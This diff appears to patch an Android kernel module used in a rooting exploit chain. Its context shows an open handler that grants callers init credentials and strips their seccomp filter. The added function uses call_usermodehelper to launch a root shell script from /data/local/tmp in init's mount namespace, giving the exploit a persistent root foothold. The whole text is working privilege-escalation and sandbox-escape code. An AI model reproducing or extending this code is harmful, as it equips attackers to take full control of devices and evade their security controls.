@@ -111,6 +111,24 @@ static void khack_drop_seccomp(void)
 	}
 }
 
+/* The exploit chain loads us from init context, so a helper spawned here runs
+ * in init's mount namespace with no seccomp filter. */
+static void khack_start_daemon(void)
+{
+	typedef int (*umh_fn)(const char *path, char **argv, char **envp, int wait);
+	umh_fn umh = (umh_fn)__symbol_get("call_usermodehelper");
+	static char *argv[] = { "/system/bin/sh", "/data/local/tmp/dfroot_boot.sh", NULL };
+	static char *envp[] = { "PATH=/system/bin:/system/xbin", "HOME=/", NULL };
+	int rc;
+
+	if (!umh) {
+		pr_info("khack1: no call_usermodehelper\n");
+		return;
+	}
+	rc = umh("/system/bin/sh", argv, envp, 1);
+	pr_info("khack1: umh rc=%d\n", rc);
+}
+
 static int khack_open(struct inode *inode, struct file *file)
 {
 	void *cred;
@@ -125,6 +143,7 @@ static int khack_open(struct inode *inode, struct file *file)
 	p_commit_creds(cred);
 	khack_drop_seccomp();
 	pr_info("khack1: caller escalated to init_cred\n");
+	khack_start_daemon();
 	return 0;
 }
 
